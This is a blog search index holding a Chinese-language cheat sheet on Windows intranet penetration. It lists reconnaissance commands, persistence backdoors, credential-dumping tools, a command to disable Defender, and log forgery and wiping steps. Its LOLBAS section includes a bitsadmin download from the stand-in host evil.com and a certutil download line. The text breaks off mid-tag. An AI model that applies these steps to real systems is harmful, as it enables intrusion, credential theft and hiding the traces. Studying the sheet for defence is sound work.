<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>不同环境下内网渗透的相关技巧</title>
    <link href="/2024/06/17/command1/"/>
    <url>/2024/06/17/command1/</url>
    
    <content type="html"><![CDATA[<p><strong>原文地址：</strong><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">传送门</a></p><h1 id="Windows内网渗透"><a href="#Windows内网渗透" class="headerlink" title="Windows内网渗透"></a>Windows内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>查看主机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hostname<br></code></pre></td></tr></table></figure><p>查询所有计算机名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dsquery computer<br></code></pre></td></tr></table></figure><p>查看配置以及相关补丁信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo<br><br>wmic qfe get description,installedOn /format:csv<br></code></pre></td></tr></table></figure><p>查看系统版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">var<br></code></pre></td></tr></table></figure><p>查看进程信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">tasklist /svc<br><br>wmic process get caption,executablepath,commandline /format:csv<br><br>get-process  //powershell运行<br></code></pre></td></tr></table></figure><p>查看所有环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">set<br></code></pre></td></tr></table></figure><p>查看计划任务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">schtasks /QUERY /fo LIST /v<br></code></pre></td></tr></table></figure><p>查看安装驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">DRIVERQUERY<br></code></pre></td></tr></table></figure><p>查看操作系统信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic os get osarchitecture //架构<br>wmic os get caption //系统名<br></code></pre></td></tr></table></figure><p>查看逻辑盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic logicaldisk get caption<br></code></pre></td></tr></table></figure><p>查看安装的软件信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic product get name,version<br></code></pre></td></tr></table></figure><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>获取当前组的计算机名：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span><br></code></pre></td></tr></table></figure><p>网络发现：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>查看所有域：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>域信任信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nltest time /domain<br></code></pre></td></tr></table></figure><p>定位域控：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure><p>查看域中的用户名：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>查询域组名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group /domain<br></code></pre></td></tr></table></figure><p>查询域管理员：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p>域控信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nltest /dclist:xx<br><br><span class="hljs-keyword">Get</span>-NetDomain<br><br><span class="hljs-keyword">Get</span>-NetDomainController<br><br>net <span class="hljs-keyword">group</span> &quot;Domain controllers&quot;<br></code></pre></td></tr></table></figure><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>查看用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user<br>whoami    whoami /priv    whoami /all<br>wmic useraccount get /ALL /format:csv<br></code></pre></td></tr></table></figure><p>用户特权信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p>查看当前权限：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><p>查看在线用户：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">quser   qwinsta   query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config Workstation<br></code></pre></td></tr></table></figure><p>ACL信息：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">get</span>-acl<br></code></pre></td></tr></table></figure><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>网卡信息：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure><p>ARP表：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>路由表：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure><p>监听的端口：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>端口信息：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-NetTCPConnection</span><br></code></pre></td></tr></table></figure><p>DNS缓存：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">ipconfig /displaydns<br><br><span class="hljs-built_in">Get</span>-CimInstance -Namespace root/StandardCimv2 -<span class="hljs-built_in">ClassName</span> MSFT_DNSClientCache<br></code></pre></td></tr></table></figure><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>查看防火墙状态：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh advfirewall <span class="hljs-keyword">show</span> allprofiles<br></code></pre></td></tr></table></figure><p>防火墙日志目录：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh firewall <span class="hljs-keyword">show</span> logging<br></code></pre></td></tr></table></figure><p>防火墙规则：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall firewall show <span class="hljs-keyword">rule</span> name=<span class="hljs-literal">all</span><br>netsh firewall show config<br>netsh firewall show <span class="hljs-keyword">state</span><br></code></pre></td></tr></table></figure><h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>无人值守安装文件中的密码信息：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">C:\sysprep.<span class="hljs-literal">inf</span><br>C:\sysprep\sysprep.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattended.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattended.xml<br></code></pre></td></tr></table></figure><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>创建系统隐藏文件：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">attrib</span> +s +a +r +h <span class="hljs-keyword">filename</span> <br><span class="hljs-keyword">attrib</span> +s +h <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="sethc"><a href="#sethc" class="headerlink" title="sethc"></a>sethc</h4><p><code>sethc.exe</code> 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code>sethc.exe</code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限</p><h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p><p>具体操作为在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code> 下添加项 <code>sethc.exe</code> ，然后在 <code>sethc.exe</code> 这个项中添加 <code>debugger</code> 键，键值为恶意程序的路径</p><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Windows下有 <code>schtasks</code> 和 <code>at</code> 两种计划任务机制。 其中 <code>at</code> 在较高版本的Windows中已经弃用。</p><p>设置命令为 <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code> 、 <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code> 。删除命令为 <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code></p><h4 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h4><p>Windows可以在用户登录前执行脚本，使用 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 设置。</p><p>也可在 <code>HKCU\Environment\</code> 路径下设置 <code>UserInitMprLogonScript</code> 来实现</p><h4 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h4><p>Windows可以自定义屏幕保护程序，使用 <code>HKEY_CURRENT_USER\Control Panel\Desktop</code> 设置</p><h4 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h4><p>Windows可以使用在用户名后加入 <code>$</code> 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p><p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看</p><h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。</p><p>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门</p><h4 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h4><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p><p>注册表位置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 用于执行exe程序</li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 用于执行exe程序</li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code> 用于执行dll文件</li></ul><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h4 id="基于注册表的自启动"><a href="#基于注册表的自启动" class="headerlink" title="基于注册表的自启动"></a>基于注册表的自启动</h4><p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code>Run</code> 和 <code>RunOnce</code> ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p><p>注册表如下：</p><ul><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li></ul><p>基于策略的自启动注册表设置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li></ul><p>设置启动文件夹注册表位置如下：</p><ul><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li></ul><p>设置服务启动项注册表位置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li></ul><p>用户自启动位置 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 、 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> ，其中 <code>Userinit</code> 键允许指定用逗号分隔的多个程序。</p><p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p><ul><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></li></ul><h4 id="基于特定目录的自启动"><a href="#基于特定目录的自启动" class="headerlink" title="基于特定目录的自启动"></a>基于特定目录的自启动</h4><p>自启动目录， <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 目录对特定用户生效， <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 对所有用户生效。在NT6以前，两个目录为 <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code> &#x2F; <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>UAC (User Account Control) 是Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p><p>当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限</p><h4 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h4><ul><li>以管理员权限启动应用</li><li>修改系统、UAC设置</li><li>修改没有权限的文件或者目录（ %SystemRoot% &#x2F; %ProgramFiles% 等 ）</li><li>修改ACL (access control list)</li><li>安装驱动</li><li>增删账户，修改账户类型，激活来宾账户</li></ul><h4 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h4><ul><li>DLL相关</li><li>进程注入</li><li>注册表</li></ul><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。</p><p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p><h4 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h4><p>在Windows中用户可以写的敏感位置主要有以下这些</p><ul><li>用户自身的文件和目录，包括 <code>AppData</code> <code>Temp</code></li><li><code>C:\</code> ，默认情况下用户可以写入</li><li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li><li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li></ul><p>具体的ACL信息可用AccessChk, 或者PowerShell的 <code>Get-Acl</code> 命令查看。</p><p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限</p><h4 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h4><p>MOF是Windows系统的一个文件（ <code>c:/windows/system32/wbem/mof/nullevt.mof</code> ）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p><p>当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p><p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户</p><h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>Windows本地密码散列导出工具</p><ul><li>mimikatz</li><li>lsass</li><li>wce</li><li>gsecdump</li><li>copypwd</li><li>Pwdump</li><li>ProcDump</li></ul><p>Windows本地密码破解工具</p><ul><li><p>L0phtCrack</p></li><li><p>SAMInside</p></li><li><p>Ophcrack</p></li><li><p>彩虹表破解</p></li><li><p>本机hash+明文抓取</p></li><li><p>win8+win2012明文抓取</p></li><li><p>ntds.dit的导出+QuarkPwDump读取分析</p></li><li><p>vssown.vbs + libesedb + NtdsXtract</p></li><li><p>ntdsdump</p></li><li><p>利用powershell(DSInternals)分析hash</p></li><li><p>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数</p></li><li><p>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>组策略首选项漏洞</li><li>DLL劫持</li><li>替换系统工具，实现后门</li><li>关闭defender<code>Set-MpPreference -disablerealtimeMonitoring $true</code></li></ul><h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>查看日志：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure><p>伪造日志：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventcreate</span><br></code></pre></td></tr></table></figure><p>操作日志：</p><ul><li>3389登录列表</li><li>文件打开日志</li><li>文件修改日志</li><li>浏览器日志</li><li>系统事件</li><li>程序安装记录</li><li>程序删除记录</li><li>程序更新记录</li></ul><p>登录日志：</p><ul><li>系统安全日志</li></ul><p>日志路径：</p><ul><li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><p>服务日志：</p><ul><li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li></ul><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ul><li>AppCompatFlags</li><li>Background Activity Moderator (BAM)</li><li>MuiCache</li><li>RecentApps</li><li>RunMRU</li><li>ShimCache (AppCompatCache)</li></ul><h4 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h4><ul><li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h4><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p><h4 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h4><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%APPDATA%\Microsoft\Windows\Recent</code></p><h4 id="Amcache-RecentFileCache-bcf"><a href="#Amcache-RecentFileCache-bcf" class="headerlink" title="Amcache &#x2F; RecentFileCache.bcf"></a>Amcache &#x2F; RecentFileCache.bcf</h4><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间</p><p>在Windows 7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名</p><p>在Windows 8、Windows 10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息</p><h3 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h3><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等</p><h3 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h3><ul><li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li><li>格式化某磁盘count次 <code>format D: /P:&lt;count&gt;</code></li></ul><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h3><ul><li>SMB弱密码</li><li>SqlServer弱密码</li></ul><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念</p><p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等</p><h4 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h4><p><strong>appsyncvpublishing.exe</strong></p><ul><li>执行powershell</li></ul><p><strong>bitsadmin.exe</strong></p><ul><li>下载文件 <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li></ul><p><strong>cdb.exe</strong></p><p><strong>certutil.exe</strong></p><ul><li>可安装、备份、删除、管理和执行证书</li><li>证书存储相关功能</li><li>下载文件 <code>certutil -urlcache -split -f https://addr/example.exe</code></li><li>注意 certutil 是有cache的，需要显式删除</li><li>base64 编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></li></ul><p><strong>cmd.exe</strong></p><p><strong>cmstp.exe</strong></p><p><strong>control.exe</strong></p><ul><li><a href="https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/">加载dll</a></li></ul><p><strong>csc.exe</strong></p><ul><li>编译 C# 载荷</li></ul><p><strong>cscript.exe</strong></p><ul><li>执行脚本</li></ul><p><strong>extexport.exe</strong></p><p><strong>expand.exe</strong></p><ul><li>展开一个或多个压缩文件</li></ul><p><strong>forfiles.exe</strong></p><ul><li><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></li></ul><p><strong>mofcomp.exe</strong></p><p><strong>makecab.exe</strong></p><p><strong>msbuild.exe</strong></p><ul><li>构建应用程序</li></ul><p><strong>mshta.exe</strong></p><ul><li>HTML应用</li></ul><p><strong>msiexec.exe</strong></p><ul><li>安装msi</li><li>加载dll</li></ul><p><strong>msxsl.exe</strong></p><ul><li>处理XSL程序</li></ul><p><strong>netsh.exe</strong></p><p><strong>installutil.exe</strong></p><ul><li>安装&#x2F;卸载程序组件</li></ul><p><strong>IEExec.exe</strong></p><ul><li>.NET Framework附带程序</li></ul><p><strong>powershell.exe</strong></p><p><strong>psexec.exe</strong></p><ul><li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></li></ul><p><strong>reg.exe</strong></p><ul><li>注册表控制台</li></ul><p><strong>regedit.exe</strong></p><ul><li>注册表修改</li></ul><p><strong>regsvr32.exe</strong></p><ul><li>注册动态链接库&#x2F;ActiveX控件</li></ul><p><strong>rundll32.exe</strong></p><ul><li>执行DLL文件中的内部函数</li></ul><p><strong>sc.exe</strong></p><ul><li>查看服务状态管理</li></ul><p><strong>schtasks.exe</strong></p><ul><li>定时计划任务</li></ul><p><strong>shred</strong></p><ul><li>重复写入文件，防止文件恢复</li></ul><p><strong>type.exe</strong></p><ul><li>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li></ul><p><strong>wmic.exe</strong></p><ul><li>Windows管理工具</li></ul><p><strong>windbg.exe</strong></p><p><strong>winrm.exe</strong></p><p><strong>wscript.exe</strong></p><ul><li>脚本引擎</li></ul><p><strong>waitfor.exe</strong></p><ul><li>用于同步网络中计算机，可以发送或等待系统上的信号</li></ul><h2 id="MSPRC"><a href="#MSPRC" class="headerlink" title="MSPRC"></a>MSPRC</h2><p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE&#x2F;RPC 协议的修改实现，用于支持Windows系统中应用程序的远程网络调用。</p><p>MSRPC所使用的端口有 UDP 135 和 TCP 139 &#x2F; 445 。</p><p>MSRPC 可以用于</p><ul><li>用户遍历</li><li>服务遍历</li><li>凭证导出</li><li>横向移动</li><li>权限提升</li></ul><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h3><h4 id="用户"><a href="#用户" class="headerlink" 